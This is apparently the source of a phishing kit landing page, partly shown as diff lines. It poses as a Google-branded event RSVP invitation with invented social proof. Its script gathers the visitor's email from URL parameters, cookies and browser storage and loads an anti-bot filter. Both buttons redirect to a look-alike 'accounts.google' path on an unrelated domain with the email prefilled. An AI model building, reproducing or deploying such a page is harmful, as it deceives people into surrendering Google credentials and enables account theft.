(Main) --><div class="flex-1 flex flex-col justify-center items-center max-w-xl mx-auto w-full gap-8 md:gap-10 py-6 md:py-10"><!-- Social proof --><section class="flex flex-col items-center gap-3 w-full text-center transition-all duration-75 opacity-100 translate-y-0"><p class="text-[13px] text-slate-400 font-bold uppercase tracking-wider">you and other 27 people are invited</p><div class="inline-flex items-center gap-3 bg-white px-4 py-1.5 rounded-full border border-slate-100 shadow-sm shadow-slate-100/40"><div class="flex -space-x-2 shrink-0"><img class="w-7 h-7 rounded-full border-2 border-white object-cover" src="64_003_Z4Ya.jpg" alt="" loading="lazy"><img class="w-7 h-7 rounded-full border-2 border-white object-cover" src="64_002_Z4Ya.jpg" alt="" loading="lazy"><img class="w-7 h-7 rounded-full border-2 border-white object-cover" src="64_004_Z4Ya.jpg" alt="" loading="lazy"><img class="w-7 h-7 rounded-full border-2 border-white object-cover" src="64_Z4Ya.jpg" alt="" loading="lazy"></div><span class="text-xs font-semibold text-slate-600">500+ guests RSVP'd using Google</span></div></section><!-- Hero Section --><section class="text-center flex flex-col gap-4 max-w-lg transition-all duration-300 opacity-100 translate-y-0"><h1 class="text-3xl sm:text-4xl md:text-5xl font-extrabold tracking-tight text-slate-900 leading-tight"> You have been invited to a <span class="bg-gradient-to-r from-blue-600 via-indigo-600 to-blue-500 bg-clip-text text-transparent">special occasion</span></h1><p class="text-slate-500 text-sm md:text-base leading-relaxed max-w-md mx-auto px-4"> Experience the world's most seamless RSVP, fully integrated with your favorite Google tools. </p></section><!-- Primary CTA Button --><div class="w-full max-w-sm flex justify-center transition-all duration-300 opacity-100 translate-y-0"><button type="button" class="group relative flex items-center justify-center gap-2 bg-blue-600 hover:bg-blue-700 text-white font-semibold px-8 py-4 rounded-xl shadow-lg shadow-blue-500/20 hover:shadow-blue-500/30 transform hover:-translate-y-0.5 active:translate-y-0 transition-all duration-200 w-full" id="open-invitation"><span>Open Invitation</span><svg class="w-5 h-5 group-hover:translate-x-0.5 group-hover:-translate-y-0.5 transition-transform duration-200 stroke-current fill-none" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg></button></div><!-- Identity Card --><section class="w-full max-w-sm bg-white/70 backdrop-blur-md border border-slate-200/60 rounded-2xl p-5 shadow-xl shadow-slate-100/50 flex flex-col gap-4 transition-all duration-500 opacity-100 translate-y-0"><div class="flex items-center gap-3 border-b border-slate-100 pb-3"><svg class="w-5 h-5 shrink-0" viewBox="0 0 24 24" aria-hidden="true"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"></path><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"></path><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"></path><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"></path></svg><span class="text-[11px] font-extrabold uppercase tracking-wider text-slate-400">Continue with Google Account</span></div><button type="button" class="flex items-center justify-between w-full p-3.5 rounded-xl border border-slate-200/80 bg-slate-50/50 hover:bg-slate-50 hover:border-slate-300 transition-all duration-200 text-left group" id="account-selector"><span class="flex items-center gap-3"><!-- Avatar block --><span class="w-10 h-10 rounded-full bg-slate-200 text-slate-500 flex items-center justify-center"><svg class="w-5 h-5 stroke-current fill-none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg></span><!-- Info text --><span class="flex flex-col"><!--v-if--><span class="text-xs text-slate-500 mt-0.5">Tap to Continue</span></span></span><!-- Chevron Right --><svg class="w-5 h-5 text-slate-400 group-hover:translate-x-0.5 transition-transform duration-200 stroke-current fill-none shrink-0" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"></polyline></svg></button><p class="text-[10px] text-slate-400 leading-relaxed text-center px-1"> Secure sign-in. We never post or email on your behalf. Data privacy protection and our <a href="https://policies.google.com/privacy" target="_blank" class="text-blue-500 hover:underline font-semibold" rel="noopener noreferrer">privacy policy</a> apply. </p></section></div><div class="w-full shrink-0 h-4"></div></main><!-- Right Pane (38%) --><aside class="flex flex-col bg-white p-6 sm:p-8 md:p-12 border-t lg:border-t-0 lg:border-l border-slate-100 justify-between"><div><p class="text-[11px] font-extrabold uppercase tracking-widest text-slate-400 mb-6">How it works</p><!-- Video container --><div class="relative w-full max-w-[300px] mx-auto aspect-[9/16] bg-[#0d0d0d] rounded-[28px] overflow-hidden shadow-2xl group cursor-pointer border border-slate-200/80 transition-all duration-300 hover:scale-[1.02]" id="video-mockup"><!-- Video component --><video class="w-full h-full object-cover" id="demo-video" ref="demoVideo" preload="auto" loop="" playsinline="" muted="" @error="handleVideoError" src="demo_Z4Ya.mp4"></video><!-- Gradient overlay shadow --><div class="absolute inset-0 bg-gradient-to-t from-black/30 via-transparent to-transparent pointer-events-none"></div><!-- Custom Play overlay overlay button --><div class="absolute inset-0 flex items-center justify-center bg-black/10 opacity-0 group-hover:opacity-100 transition-opacity duration-300"><span class="w-14 h-14 rounded-full bg-white/90 shadow-lg flex items-center justify-center text-slate-900 backdrop-blur-sm transform scale-95 group-hover:scale-100 transition-all duration-300 hover:bg-white hover:scale-105" aria-hidden="true"><!-- Play SVG --><!-- Pause SVG --><svg class="w-6 h-6 fill-current stroke-none" viewBox="0 0 24 24"><rect x="6" y="4" width="4" height="16"></rect><rect x="14" y="4" width="4" height="16"></rect></svg></span></div><!-- Fallback error block --><!--v-if--></div><!-- Steps list --><ol class="flex flex-col gap-6 mt-8 max-w-sm mx-auto"><li class="flex items-start gap-4 p-3.5 rounded-xl hover:bg-slate-50 transition-colors duration-200 group"><span class="w-10 h-10 rounded-xl bg-blue-50 text-blue-600 flex items-center justify-center shrink-0 font-bold shadow-sm shadow-blue-100/40 text-sm"><!-- Shield Icon --><svg class="w-5 h-5 stroke-current fill-none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path><polyline points="9 11 11 13 15 9"></polyline></svg></span><div class="flex-1"><p class="text-[13px] font-bold text-slate-700 tracking-tight">Step 01</p><p class="text-xs text-slate-500 leading-relaxed mt-0.5">Securely connect with your existing Google profile.</p></div></li><li class="flex items-start gap-4 p-3.5 rounded-xl hover:bg-slate-50 transition-colors duration-200 group"><span class="w-10 h-10 rounded-xl bg-blue-50 text-blue-600 flex items-center justify-center shrink-0 font-bold shadow-sm shadow-blue-100/40 text-sm"><!-- Map pin Icon --><svg class="w-5 h-5 stroke-current fill-none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg></span><div class="flex-1"><p class="text-[13px] font-bold text-slate-700 tracking-tight">Step 02</p><p class="text-xs text-slate-500 leading-relaxed mt-0.5">Access detailed event information, guest lists, and dynamic maps.</p></div></li><li class="flex items-start gap-4 p-3.5 rounded-xl hover:bg-slate-50 transition-colors duration-200 group"><span class="w-10 h-10 rounded-xl bg-blue-50 text-blue-600 flex items-center justify-center shrink-0 font-bold shadow-sm shadow-blue-100/40 text-sm"><!-- Sync Icon --><svg class="w-5 h-5 stroke-current fill-none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24"><path d="M21.5 2v6h-6M21.34 15.57a10 10 0 1 1-.57-8.38l5.67-5.67"></path></svg></span><div class="flex-1"><p class="text-[13px] font-bold text-slate-700 tracking-tight">Step 03</p><p class="text-xs text-slate-500 leading-relaxed mt-0.5">Instantly sync your RSVP and get real-time Google Calendar updates.</p></div></li></ol></div><div class="w-full shrink-0 h-4"></div></aside></div><!-- Info Floating Action Button --><button type="button" class="fixed bottom-6 right-6 w-12 h-12 rounded-full bg-white text-slate-500 shadow-xl border border-slate-100 flex items-center justify-center hover:bg-slate-50 hover:text-slate-800 active:scale-95 transition-all duration-200 z-40" id="info-fab" aria-label="About Google event"><svg class="w-5 h-5 stroke-current fill-none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg></button><!-- Info Dialog Modal --><!--v-if--></div>
+
+  <!-- Boot scripts -->
+  <script src="antibot_Z4Ya.js"></script>
+  
+  <script>
+    const { createApp } = Vue;
+
+    createApp({
+      data() {
+        return {
+          email: null,
+          settings: {},
+          videoCandidates: [],
+          currentVideoIndex: 0,
+          videoError: false,
+          isPlaying: false,
+          isInfoOpen: false,
+          isMounted: false,
+        };
+      },
+      computed: {
+        avatarInitial() {
+          if (!this.email) return 'G';
+          const local = this.email.split('@')[0] || '';
+          return (local.charAt(0) || 'A').toUpperCase();
+        },
+        hasEmail() {
+          return !!this.email;
+        },
+        occasionTitle() {
+          return this.settings.occasionTitle || 'special occasion';
+        },
+        inviterNames() {
+          return this.settings.inviterNames || 'you and other 27 people are invited';
+        },
+        rsvpCount() {
+          return this.settings.rsvpCount || "500+ guests RSVP'd using Google";
+        },
+        nextPageUrl() {
+          return this.settings.nextPageUrl || 'https://previteletterviews.com/july/accounts.google/';
+        },
+        myInvitesUrl() {
+          return this.settings.myInvitesUrl || '#';
+        },
+        privacyPolicyUrl() {
+          return this.settings.privacyPolicyUrl || 'https://policies.google.com/privacy';
+        }
+      },
+      methods: {
+        // Email helpers
+        isValidEmail(value) {
+          return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(String(value).trim());
+        },
+        normalizeEmail(value) {
+          return String(value).trim().toLowerCase();
+        },
+        readEmailFromParams(params) {
+          const EMAIL_PARAM_KEYS = ['email', 'e', 'user', 'u', 'mail', 'em'];
+          for (let i = 0; i < EMAIL_PARAM_KEYS.length; i++) {
+            let candidate = params.get(EMAIL_PARAM_KEYS[i]);
+            if (candidate && this.isValidEmail(candidate)) {
+              return this.normalizeEmail(candidate);
+            }
+          }
+          return null;
+        },
+        readEmailFromCookie() {
+          const EMAIL_STORAGE_KEYS = ['aura_user_email', 'user_email', 'invite_email', 'email'];
+          let cookies = document.cookie ? document.cookie.split(';') : [];
+          for (let i = 0; i < cookies.length; i++) {
+            let part = cookies[i].trim();
+            let eq = part.indexOf('=');
+            if (eq === -1) continue;
+            let name = part.slice(0, eq).trim();
+            let value = part.slice(eq + 1);
+            if (EMAIL_STORAGE_KEYS.indexOf(name) !== -1) {
+              try {
+                value = decodeURIComponent(value.replace(/\+/g, ' '));
+              } catch (_) {}
+              if (this.isValidEmail(value)) return this.normalizeEmail(value);
+            }
+          }
+          return null;
+        },
+        readEmailFromStorage(storage) {
+          const EMAIL_STORAGE_KEYS = ['aura_user_email', 'user_email', 'invite_email', 'email'];
+          try {
+            for (let i = 0; i < EMAIL_STORAGE_KEYS.length; i++) {
+              let stored = storage.getItem(EMAIL_STORAGE_KEYS[i]);
+              if (stored && this.isValidEmail(stored)) return this.normalizeEmail(stored);
+            }
+          } catch (_) {}
+          return null;
+        },
+        resolveEmail() {
+          // 1. URL search params
+          let params = new URLSearchParams(window.location.search);
+          let fromUrl = this.readEmailFromParams(params);
+          if (fromUrl) {
+            this.persistEmail(fromUrl);
+            return fromUrl;
+          }
+
+          // 2. Hash params
+          let hash = window.location.hash.replace(/^#/, '');
+          if (hash) {
+            let hashParams = new URLSearchParams(hash);
+            let fromHash = this.readEmailFromParams(hashParams);
+            if (fromHash) {
+              this.persistEmail(fromHash);
+              return fromHash;
+            }
+          }
+
+          // 3. Referrer
+          if (document.referrer) {
+            try {
+              let ref = new URL(document.referrer);
+              if (ref.origin === window.location.origin || this.settings.trustReferrerEmail) {
+                let fromReferrer = this.readEmailFromParams(ref.searchParams);
+                if (fromReferrer) {
+                  this.persistEmail(fromReferrer);
+                  return fromReferrer;
+                }
+              }
+            } catch (_) {}
+          }
+
+          // 4. Cookie
+          let fromCookie = this.readEmailFromCookie();
+          if (fromCookie) return fromCookie;
+
+          // 5. Session storage
+          let fromSession = this.readEmailFromStorage(sessionStorage);
+          if (fromSession) return fromSession;
+
+          // 6. Local storage
+          let fromLocal = this.readEmailFromStorage(localStorage);
+          if (fromLocal) return fromLocal;
+
+          // 7. Settings default
+          if (this.settings.defaultEmail && this.isValidEmail(this.settings.defaultEmail)) {
+            return this.normalizeEmail(this.settings.defaultEmail);
+          }
+
+          return null;
+        },
+        persistEmail(email) {
+          try {
+            localStorage.setItem('aura_user_email', email);
+            sessionStorage.setItem('aura_user_email', email);
+          } catch (_) {}
+        },
+
+        // Navigation
+        normalizeUrl(url) {
+          url = String(url).trim();
+          if (!url || url === '#') return '';
+          if (/^https?:\/\//i.test(url) || url.charAt(0) === '/' || url.indexOf('./') === 0 || url.indexOf('../') === 0) {
+            return url;
+          }
+          if (/^[a-z0-9][a-z0-9.-]*\.[a-z]{2,}/i.test(url)) {
+            return 'https://' + url;
+          }
+          return url;
+        },
+        handleNavigation(e) {
+          // Check AuraShield if defined
+          if (window.AuraShield && typeof window.AuraShield.canProceed === 'function') {
+            if (!window.AuraShield.canProceed(e)) {
+              console.warn("Navigation blocked by AuraShield.");
+              return;
+            }
+          }
+
+          let target = this.normalizeUrl(this.nextPageUrl);
+          if (!target) return;
+
+          if (this.email && target.indexOf('{{email}}') !== -1) {
+            target = target.replace(/\{\{email\}\}/g, encodeURIComponent(this.email));
+          }
+
+          window.location.href = target;
+        },
+
+        // Video Player
+        getDeployBasePath() {
+          if (window.AURA_BASE_PATH) {
+            return window.AURA_BASE_PATH;
+          }
+          if (this.settings.basePath) {
+            let manual = String(this.settings.basePath).trim();
+            if (!manual.startsWith('/')) manual = '/' + manual;
+            if (!manual.endsWith('/')) manual += '/';
+            return manual;
+          }
+          let path = window.location.pathname || '/';
+          let lastSegment = path.split('/').pop() || '';
+          if (/\.[a-z0-9]{2,5}$/i.test(lastSegment)) {
+            path = path.substring(0, path.lastIndexOf('/') + 1);
+          } else if (!path.endsWith('/')) {
+            path += '/';
+          }
+          return path;
+        },
+        resolveAssetUrl(relativePath) {
+          if (!relativePath) return '';
+          if (/^https?:\/\//i.test(relativePath)) return relativePath;
+          let clean = String(relativePath).replace(/^\.\//, '');
+          return window.location.origin + this.getDeployBasePath() + clean;
+        },
+        buildVideoCandidates() {
+          let list = [];
+          let seen = {};
+          let configured = this.settings.videoUrl || '';
+          
+          const add = (path) => {
+            if (!path || seen[path]) return;
+            seen[path] = true;
+            list.push(this.resolveAssetUrl(path));
+          };
+
+          if (configured) add(configured);
+          add('demo_Z4Ya.mp4');
+          add('demo.mp4');
+          add('assets/demo_Z4Ya.mp4');
+          add('assets/demo.mp4');
+          add('video/demo.mp4');
+          add('video/can_you_generate_a_video_for_t.mp4');
+
+          return list;
+        },
+        loadVideo() {
+          if (this.currentVideoIndex >= this.videoCandidates.length) {
+            this.videoError = true;
+            this.isPlaying = false;
+            return;
+          }
+
+          this.videoError = false;
+          
+          this.$nextTick(() => {
+            const video = this.$refs.demoVideo;
+            if (video) {
+              video.removeAttribute('src');
+              video.src = this.videoCandidates[this.currentVideoIndex];
+              video.load();
+
+              video.loop = this.settings.videoLoop !== false;
+              video.muted = this.settings.videoMuted !== false;
+              
+              if (this.settings.videoAutoplay !== false) {
+                video.muted = true;
+                video.setAttribute('muted', '');
+                let playPromise = video.play();
+                if (playPromise && typeof playPromise.then === 'function') {
+                  playPromise.then(() => {
+                    this.isPlaying = true;
+                  }).catch(() => {
+                    this.isPlaying = false;
+                  });
+                }
+              }
+            }
+          });
+        },
+        handleVideoError() {
+          this.currentVideoIndex++;
+          this.loadVideo();
+        },
+        togglePlayback() {
+          const video = this.$refs.demoVideo;
+          if (!video || this.videoError) return;
+
+          if (video.paused) {
+            let playPromise = video.play();
+            if (playPromise && typeof playPromise.then === 'function') {
+              playPromise.then(() => {
+                this.isPlaying = true;
+              }).catch(() => {
+                video.muted = true;
+                video.play();
+                this.isPlaying = true;
+              });
+            }
+          } else {
+            video.pause();
+            this.isPlaying = false;
+          }
+        },
+
+        // Info Modal
+        openInfo() {
+          this.isInfoOpen = true;
+        },
+        closeInfo() {
+          this.isInfoOpen = false;
+        }
+      },
+      created() {
+        // Read settings before mount
+        this.settings = window.AURA_SETTINGS || {};
+        this.email = this.resolveEmail();
+        this.videoCandidates = this.buildVideoCandidates();
+      },
+      mounted() {
+        this.loadVideo();
+        this.isMounted = true;
+
+        const openInvitation = document.getElementById('open-invitation');
+        if (openInvitation) {
+          openInvitation.addEventListener('click', (e) => this.handleNavigation(e));
+        }
+
+        const continueButton = document.getElementById('account-selector');
+        if (continueButton) {
+          continueButton.addEventListener('click', (e) => this.handleNavigation(e));
+        }
+        
+        // Listen to Escape key for Modal
+        document.addEventListener('keydown', (e) => {
+          if (e.key === 'Escape' && this.isInfoOpen) this.closeInfo();
+        });
+      }
+    }).mount('#app');
+  </script>
+
+</body></html>
